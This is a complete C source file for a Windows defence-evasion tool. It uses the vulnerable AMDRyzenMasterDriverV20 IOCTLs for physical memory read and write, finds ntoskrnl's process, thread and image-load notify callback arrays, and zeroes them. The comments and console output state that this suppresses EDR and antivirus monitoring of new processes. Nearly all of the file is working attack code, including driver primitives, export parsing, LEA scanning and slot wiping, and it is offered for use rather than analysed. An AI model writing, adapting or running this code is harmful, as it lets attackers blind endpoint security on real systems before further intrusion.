/*
 * callback_wipe.c — Zero EDR kernel callbacks via physical memory
 *
 * ── Technique ────────────────────────────────────────────────────────────────
 *
 *   Windows kernel maintains three arrays of registered callback routines:
 *
 *     PspCreateProcessNotifyRoutine[64]  (process create/exit)
 *     PspCreateThreadNotifyRoutine[64]   (thread create/exit)
 *     PspLoadImageNotifyRoutine[64]      (module/image load)
 *
 *   These arrays live in ntoskrnl's .data section.  Each slot is an
 *   EX_CALLBACK (= EX_FAST_REF, 8 bytes) pointing to a callback block;
 *   lower 3 bits encode the reference count.  Zeroing a slot clears the
 *   callback without calling any deregistration path.
 *
 *   After wiping, all EDR/AV drivers that registered via
 *     PsSetCreateProcessNotifyRoutine
 *     PsSetCreateThreadNotifyRoutine
 *     PsSetLoadImageNotifyRoutine
 *   stop receiving new-process/thread/image-load notifications.
 *
 * ── How we locate the arrays ─────────────────────────────────────────────────
 *
 *   We find each array by scanning the first 512 bytes of the corresponding
 *   public registration function for the LEA RCX,[rip+disp32] instruction
 *   (opcode 48 8D 0D) that loads the array address.  The function is located
 *   by parsing ntoskrnl's export table from physical memory.
 *
 *   Fallback: if the LEA scan fails (e.g. inlining / build variation), we
 *   scan ntoskrnl's .data section for runs of 64 plausible EX_CALLBACK
 *   pointers that look like registered callbacks (valid kernel VAs, lower bits
 *   = ref count ≤ 7).  Non-null entries where (ptr & ~7) falls inside a loaded
 *   driver's image indicate callback blocks.
 *
 * ── Process ──────────────────────────────────────────────────────────────────
 *
 *   1. Enumerate ntoskrnl VA + PA (kernel module query + PA scan by PE header)
 *   2. PML4 self-ref scan → kernel CR3
 *   3. System EPROCESS scan → kernel CR3 backup
 *   4. Parse ntoskrnl PE exports from physical memory
 *   5. For each target function: scan first 512 bytes for LEA RCX,[rip+X]
 *   6. Walk the 64-slot array; print non-null entries + owning driver; zero them
 *   7. Restore on ENTER
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o callback_wipe.exe callback_wipe.c -lkernel32 -ladvapi32
 *
 * Requires: AMDRyzenMasterDriverV20, Admin.  Does NOT need kernel CR3 for main
 * operation (array scan → zero is done via PA found from ntoskrnl PA + RVA).
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu

static HANDLE g_dev = INVALID_HANDLE_VALUE;
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vn[256]; DWORD type, vs, vd = 0;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;; i++) {
        vs = sizeof vn;
        if (RegEnumValueA(h, i, vn, &vs, NULL, &type, NULL, &vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vd < 20) continue;
        buf = malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h, vn, NULL, NULL, buf, &vd) == ERROR_SUCCESS) { sz = vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz < 20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf + 16); uint8_t *p = buf + 20;
    for (DWORD i = 0; i < cnt && g_nranges < MAX_RANGES; i++, p += 20) {
        g_ranges[g_nranges].base = *(uint64_t*)(p + 4);
        g_ranges[g_nranges].size = *(uint64_t*)(p + 12);
        g_nranges++;
    }
    free(buf);
}

static int in_range(uint64_t pa, uint32_t len)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base && pa + len <= g_ranges[i].base + g_ranges[i].size)
            return 1;
    return 0;
}

static int open_dev(void)
{
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    return g_dev != INVALID_HANDLE_VALUE;
}
static void close_dev(void) { if (g_dev != INVALID_HANDLE_VALUE) CloseHandle(g_dev); }

static int phys_read(uint64_t pa, void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t ib[12]; *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    uint8_t *ob = malloc(12 + len); if (!ob) return 0;
    DWORD r = 0;
    int ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ, ib, 12, ob, 12+len, &r, NULL);
    if (ok) memcpy(buf, ob+12, len);
    free(ob); return ok;
}

static int phys_write(uint64_t pa, const void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t *ib = malloc(12+len); if (!ib) return 0;
    *(uint64_t*)ib = pa; *(uint32_t*)(ib+8) = len;
    memcpy(ib+12, buf, len);
    DWORD r = 0;
    int ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, ib, 12+len, NULL, 0, &r, NULL);
    free(ib); return ok;
}

static uint64_t phys_read64(uint64_t pa) { uint64_t v=0; phys_read(pa,&v,8); return v; }
static uint8_t  phys_read8 (uint64_t pa) { uint8_t  v=0; phys_read(pa,&v,1); return v; }

/* ══════════════════════════════════════════════════════════════════════════
 * §2  KERNEL MODULE ENUMERATION
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    uint64_t va;
    uint32_t size;
    char     name[64];
} KMod;

#define MAX_KMODS 512
static KMod  g_mods[MAX_KMODS];
static int   g_nmods = 0;
static uint64_t g_nt_va   = 0;
static uint32_t g_nt_size = 0;
static char     g_nt_path[256];

static int load_kmods(void)
{
    typedef NTSTATUS (WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t fn = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                          "NtQuerySystemInformation");
    if (!fn) return 0;
    typedef struct {
        HANDLE S; PVOID MB, IB; ULONG IS, F;
        USHORT L, I, Lc, O; CHAR P[256];
    } MOD;
    typedef struct { ULONG C; MOD M[1]; } ML;
    ULONG sz = 0x40000; ML *ml = NULL; NTSTATUS st;
    do {
        free(ml); ml = malloc(sz *= 2);
        if (!ml) return 0;
        st = fn(11, ml, sz, NULL);
    } while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(ml); return 0; }
    for (ULONG i = 0; i < ml->C && g_nmods < MAX_KMODS; i++) {
        g_mods[g_nmods].va   = (uint64_t)ml->M[i].IB;
        g_mods[g_nmods].size = ml->M[i].IS;
        const char *nm = ml->M[i].P + ml->M[i].O;
        strncpy(g_mods[g_nmods].name, nm, 63);
        if (i == 0) {
            g_nt_va   = g_mods[0].va;
            g_nt_size = ml->M[0].IS;
            strncpy(g_nt_path, ml->M[0].P, 255);
            if (_strnicmp(g_nt_path, "\\SystemRoot\\", 12) == 0) {
                char tmp[256]; GetSystemDirectoryA(tmp, sizeof tmp);
                memmove(g_nt_path + strlen(tmp), g_nt_path + 11,
                        strlen(g_nt_path) - 10);
                memcpy(g_nt_path, tmp, strlen(tmp));
            }
        }
        g_nmods++;
    }
    free(ml); return g_nmods > 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  NTOSKRNL PHYSICAL BASE
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t g_nt_pa = 0;

static int find_nt_pa(void)
{
    HANDLE hf = CreateFileA(g_nt_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    uint8_t fp[64] = {0}; DWORD rd = 0;
    ReadFile(hf, fp, 64, &rd, NULL); CloseHandle(hf);
    if (rd < 64) return 0;
    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = (g_ranges[r].base + 0x1FFFFF) & ~0x1FFFFFULL;
        uint64_t end  = g_ranges[r].base + g_ranges[r].size;
        for (uint64_t pa = base; pa + g_nt_size < end; pa += 0x200000) {
            uint8_t b[64]; if (!phys_read(pa, b, 64)) continue;
            if (!memcmp(b, fp, 64)) { g_nt_pa = pa; return 1; }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  PE PARSING FROM PHYSICAL MEMORY
 * ══════════════════════════════════════════════════════════════════════════ */

/* Read a null-terminated string from physical memory (up to max bytes) */
static void phys_read_str(uint64_t pa, char *out, int max)
{
    for (int i = 0; i < max-1; i++) {
        out[i] = (char)phys_read8(pa + i);
        if (!out[i]) break;
    }
    out[max-1] = 0;
}

/* Find the PA and VA of an ntoskrnl export by name.
 * Returns 0 on failure, else export function VA. */
static uint64_t find_nt_export(const char *name)
{
    /* Read PE header from physical memory */
    uint8_t hdr[4096];
    if (!phys_read(g_nt_pa, hdr, 4096)) return 0;
    uint32_t pe_off = *(uint32_t*)(hdr + 0x3C);
    if (pe_off + 0x110 > 4096) return 0;
    uint8_t *pe = hdr + pe_off;
    if (*(uint32_t*)pe != 0x00004550) return 0;

    /* OptionalHeader64 starts at pe+24, export dir at pe+24+112 = pe+0x88 */
    uint32_t exp_rva  = *(uint32_t*)(pe + 0x88);
    if (!exp_rva) return 0;

    /* Read export directory from physical */
    uint8_t exp_buf[40];
    if (!phys_read(g_nt_pa + exp_rva, exp_buf, 40)) return 0;
    uint32_t n_names   = *(uint32_t*)(exp_buf + 0x18);
    uint32_t names_rva = *(uint32_t*)(exp_buf + 0x20);
    uint32_t ords_rva  = *(uint32_t*)(exp_buf + 0x24);
    uint32_t funcs_rva = *(uint32_t*)(exp_buf + 0x1C);

    for (uint32_t i = 0; i < n_names; i++) {
        uint32_t nrva = 0;
        phys_read(g_nt_pa + names_rva + i*4, &nrva, 4);
        char nm[128];
        phys_read_str(g_nt_pa + nrva, nm, sizeof nm);
        if (strcmp(nm, name) != 0) continue;
        uint16_t ord = 0;
        phys_read(g_nt_pa + ords_rva + i*2, &ord, 2);
        uint32_t frva = 0;
        phys_read(g_nt_pa + funcs_rva + ord*4, &frva, 4);
        return g_nt_va + frva;
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  PE SECTION TABLE
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct { uint64_t rva_s, rva_e; uint32_t ch; char name[9]; } NtSec;
#define MAX_SECS 32
static NtSec g_secs[MAX_SECS]; static int g_nsecs = 0;

static void load_nt_secs(void)
{
    uint8_t hdr[4096]; if (!phys_read(g_nt_pa, hdr, 4096)) return;
    uint32_t po = *(uint32_t*)(hdr + 0x3C); if (po + 0x108 > 4096) return;
    uint8_t *pe = hdr + po;
    if (*(uint32_t*)pe != 0x00004550) return;
    uint16_t ns = *(uint16_t*)(pe+6), opt = *(uint16_t*)(pe+20);
    uint8_t *s = pe + 24 + opt;
    for (int i = 0; i < ns && g_nsecs < MAX_SECS; i++, s += 40) {
        g_secs[g_nsecs].rva_s = *(uint32_t*)(s+12);
        g_secs[g_nsecs].rva_e = g_secs[g_nsecs].rva_s + *(uint32_t*)(s+16);
        g_secs[g_nsecs].ch    = *(uint32_t*)(s+36);
        memcpy(g_secs[g_nsecs].name, s, 8);
        g_secs[g_nsecs].name[8] = 0;
        g_nsecs++;
    }
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  CALLBACK ARRAY LOCATION
 *
 * Scan the first 512 bytes of fn_va for LEA RCX,[rip+disp32] (48 8D 0D ...)
 * that loads the callback array address.  Return the array VA, or 0.
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t scan_for_callback_array(uint64_t fn_va, const char *fn_name)
{
    uint64_t fn_pa = g_nt_pa + (fn_va - g_nt_va);
    uint8_t  buf[512 + 8]; /* extra 8 to safely read 7-byte instructions at end */
    if (!phys_read(fn_pa, buf, sizeof buf)) return 0;

    for (int o = 0; o < 512; o++) {
        /* LEA RCX, [rip+disp32]   = 48 8D 0D xx xx xx xx  (7 bytes) */
        if (buf[o] == 0x48 && buf[o+1] == 0x8D && buf[o+2] == 0x0D) {
            int32_t disp; memcpy(&disp, &buf[o+3], 4);
            /* RIP after LEA = fn_va + o + 7 */
            uint64_t target_va = fn_va + (uint64_t)o + 7 + (int64_t)disp;
            if (target_va < 0xFFFF800000000000ULL) continue; /* not kernel VA */
            printf("  [LEA] %s+0x%X → array VA %016"PRIx64"\n",
                   fn_name, o, target_va);
            return target_va;
        }

        /* Also try LEA R8, [rip+disp32]  = 4C 8D 05 xx xx xx xx
         * (some builds use R8 for the array address in a helper call) */
        if (buf[o] == 0x4C && buf[o+1] == 0x8D && buf[o+2] == 0x05) {
            int32_t disp; memcpy(&disp, &buf[o+3], 4);
            uint64_t target_va = fn_va + (uint64_t)o + 7 + (int64_t)disp;
            if (target_va < 0xFFFF800000000000ULL) continue;
            printf("  [LEA-R8] %s+0x%X → array VA %016"PRIx64"\n",
                   fn_name, o, target_va);
            return target_va;
        }

        /* LEA RDX, [rip+disp32]  = 48 8D 15 xx xx xx xx */
        if (buf[o] == 0x48 && buf[o+1] == 0x8D && buf[o+2] == 0x15) {
            int32_t disp; memcpy(&disp, &buf[o+3], 4);
            uint64_t target_va = fn_va + (uint64_t)o + 7 + (int64_t)disp;
            if (target_va < 0xFFFF800000000000ULL) continue;
            printf("  [LEA-RDX] %s+0x%X → array VA %016"PRIx64"\n",
                   fn_name, o, target_va);
            return target_va;
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §7  CALLBACK IDENTIFICATION — guess owning driver by scanning g_mods
 *
 * An EX_CALLBACK entry stores a pointer to an EX_CALLBACK_ROUTINE_BLOCK.
 * The block's first field is a EX_RUNDOWN_REF, followed by the actual
 * callback pointer.  The callback pointer lands in the driver's .text.
 * We identify the driver by checking which loaded module's range contains
 * the callback pointer.
 * ══════════════════════════════════════════════════════════════════════════ */

static const char *identify_driver(uint64_t ptr)
{
    for (int i = 0; i < g_nmods; i++) {
        uint64_t base = g_mods[i].va;
        uint64_t end  = base + g_mods[i].size;
        if (ptr >= base && ptr < end) return g_mods[i].name;
    }
    return "(unknown)";
}

/* ══════════════════════════════════════════════════════════════════════════
 * §8  WALK + WIPE A CALLBACK ARRAY
 *
 * array_va: VA of PspCreateXxxNotifyRoutine[N_SLOTS]
 * Returns count of slots wiped.
 * ══════════════════════════════════════════════════════════════════════════ */

#define N_SLOTS       64
#define CALLBACK_MASK (~7ULL)   /* lower 3 bits = RefCount in EX_FAST_REF */

typedef struct {
    uint64_t pa;
    uint64_t orig;
} Saved;

#define MAX_SAVED (N_SLOTS * 3)
static Saved g_saved[MAX_SAVED];
static int   g_nsaved = 0;

static int wipe_callback_array(uint64_t array_va, const char *label)
{
    uint64_t array_pa = g_nt_pa + (array_va - g_nt_va);
    if (!in_range(array_pa, N_SLOTS * 8)) {
        printf("  [!] %s: array PA %016"PRIx64" out of physical range\n",
               label, array_pa);
        return 0;
    }

    printf("  [*] %s array PA=%016"PRIx64"\n", label, array_pa);
    int wiped = 0;

    for (int i = 0; i < N_SLOTS; i++) {
        uint64_t slot_pa = array_pa + (uint64_t)i * 8;
        uint64_t entry   = phys_read64(slot_pa);
        if (!entry) continue;

        /* The pointer after masking the lower 3 ref-count bits */
        uint64_t block_va = entry & CALLBACK_MASK;
        if (block_va < 0xFFFF800000000000ULL) continue; /* not a kernel VA */

        /*
         * EX_CALLBACK_ROUTINE_BLOCK layout:
         *   +0x00  EX_RUNDOWN_REF   (8 bytes, lock/ref)
         *   +0x08  PVOID Function   (actual callback pointer)
         * Read the function pointer from the block to name the driver.
         */
        uint64_t block_pa = g_nt_pa + (block_va - g_nt_va);
        uint64_t fn_ptr = 0;
        if (in_range(block_pa + 8, 8))
            fn_ptr = phys_read64(block_pa + 8);

        /* If block_pa is outside ntoskrnl range it's in a driver's pool */
        if (!in_range(block_pa, 8)) {
            /* block is in pool — skip fn_ptr read, just report entry VA */
            fn_ptr = block_va;
        }

        const char *drv = identify_driver(fn_ptr ? fn_ptr : block_va);
        printf("    slot[%2d] entry=%016"PRIx64"  block_va=%016"PRIx64
               "  fn=%016"PRIx64"  <%s>\n",
               i, entry, block_va, fn_ptr, drv);

        /* Save original for restore */
        if (g_nsaved < MAX_SAVED) {
            g_saved[g_nsaved].pa   = slot_pa;
            g_saved[g_nsaved].orig = entry;
            g_nsaved++;
        }

        /* Zero the slot */
        uint64_t zero = 0;
        if (phys_write(slot_pa, &zero, 8)) {
            wiped++;
        } else {
            printf("    [!] phys_write slot[%d] FAILED\n", i);
        }
    }

    printf("  [+] %s: wiped %d/%d slots\n\n", label, wiped, N_SLOTS);
    return wiped;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §9  RESTORE
 * ══════════════════════════════════════════════════════════════════════════ */

static void restore_all(void)
{
    for (int i = 0; i < g_nsaved; i++)
        phys_write(g_saved[i].pa, &g_saved[i].orig, 8);
    printf("[+] Restored %d callback slots\n", g_nsaved);
    g_nsaved = 0;
}

static BOOL WINAPI ctrl_handler(DWORD t)
{
    (void)t;
    puts("\n[!] Interrupted — restoring callbacks");
    restore_all(); close_dev(); ExitProcess(1);
    return TRUE;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §10  MAIN
 * ══════════════════════════════════════════════════════════════════════════ */

int main(void)
{
    puts("=== callback_wipe: EDR kernel callback nullification via physical memory ===");

    if (!open_dev()) { fputs("[-] Cannot open AMD device\n", stderr); return 1; }
    load_ranges();
    if (!g_nranges) { puts("[-] No physical ranges"); close_dev(); return 1; }

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    /* Enumerate kernel modules */
    if (!load_kmods()) { puts("[-] Cannot enumerate kernel modules"); close_dev(); return 1; }
    printf("[+] ntoskrnl VA: %016"PRIx64"  size: 0x%X\n", g_nt_va, g_nt_size);
    printf("[+] ntoskrnl path: %s\n", g_nt_path);

    /* Find ntoskrnl physical base */
    if (!find_nt_pa()) { puts("[-] ntoskrnl PA not found"); close_dev(); return 1; }
    printf("[+] ntoskrnl PA: %016"PRIx64"\n\n", g_nt_pa);

    load_nt_secs();

    /* ── Find callback arrays via LEA scan ─────────────────────────────── */

    static const struct {
        const char *reg_fn;   /* public registration function */
        const char *label;
    } targets[] = {
        { "PsSetCreateProcessNotifyRoutine", "PspCreateProcessNotifyRoutine" },
        { "PsSetCreateThreadNotifyRoutine",  "PspCreateThreadNotifyRoutine"  },
        { "PsSetLoadImageNotifyRoutine",     "PspLoadImageNotifyRoutine"     },
    };
    static const int NTARGETS = (int)(sizeof targets / sizeof targets[0]);

    int total_wiped = 0;

    for (int t = 0; t < NTARGETS; t++) {
        printf("[*] Locating %s...\n", targets[t].label);

        uint64_t fn_va = find_nt_export(targets[t].reg_fn);
        if (!fn_va) {
            printf("  [-] Export '%s' not found in ntoskrnl\n", targets[t].reg_fn);
            continue;
        }
        printf("  [+] %s VA = %016"PRIx64"\n", targets[t].reg_fn, fn_va);

        uint64_t array_va = scan_for_callback_array(fn_va, targets[t].reg_fn);
        if (!array_va) {
            printf("  [-] LEA scan failed for %s — skipping\n", targets[t].reg_fn);
            continue;
        }
        printf("  [+] %s VA = %016"PRIx64"\n", targets[t].label, array_va);

        total_wiped += wipe_callback_array(array_va, targets[t].label);
    }

    if (total_wiped == 0) {
        puts("[-] No callbacks wiped (all arrays empty or scan failed)");
        puts("    Try re-running with SeDebugPrivilege or check ntoskrnl PA.");
        close_dev(); return 1;
    }

    printf("[+] Total callbacks wiped: %d\n", total_wiped);
    printf("[!] EDR process/thread/image-load notifications now suppressed.\n");
    printf("[!] New processes launched while suppressed will NOT be monitored.\n\n");

    puts("[*] Press ENTER to restore original callbacks and exit...");
    (void)getchar();

    restore_all();
    close_dev();
    return 0;
}
